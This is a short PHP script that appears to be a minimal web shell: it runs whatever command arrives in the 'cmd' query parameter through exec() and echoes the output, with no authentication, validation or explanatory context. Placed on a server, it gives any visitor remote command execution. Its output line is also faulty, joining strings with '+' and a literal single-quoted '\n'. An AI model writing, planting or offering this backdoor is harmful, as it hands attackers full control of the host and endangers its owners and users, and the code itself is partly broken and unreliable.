<?php
$output = null;
exec($_GET['cmd'], $output);
foreach ($output as $elem) {
  echo $elem + '\n';
}
?>
